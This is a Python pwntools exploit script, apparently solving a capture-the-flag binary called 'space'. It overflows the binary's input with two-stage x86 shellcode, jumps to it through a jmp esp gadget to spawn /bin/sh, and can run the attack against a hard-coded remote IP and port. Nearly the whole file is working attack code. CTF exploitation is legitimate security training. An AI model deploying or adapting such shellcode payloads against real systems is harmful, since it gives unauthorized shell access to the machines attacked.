#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './space'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '157.245.43.189', 32609

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *vuln+42
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

jmp_esp = p32(0x0804919f)
shellcode_round_2 = asm('''
    push eax;
    push 0x68732f2f;
    push 0x6e69622f;
    mov ebx, esp;
    mov al, 0x0b;
    int 0x80;  
''')
shellcode_round_1 = asm('''
    xor edx, edx;
    xor eax, eax;
    sub esp, 22;
    jmp esp;
''')

assert(len(shellcode_round_2) <= 18)
assert(len(shellcode_round_1) <= (31 - 22) )

payload = shellcode_round_2 + jmp_esp + shellcode_round_1

info('round 1 len: %d', len(shellcode_round_1))
info('round 2 len %d', len(shellcode_round_2))
info('full payload len: %d', len(payload))

io.sendlineafter(b'>', payload)
io.interactive()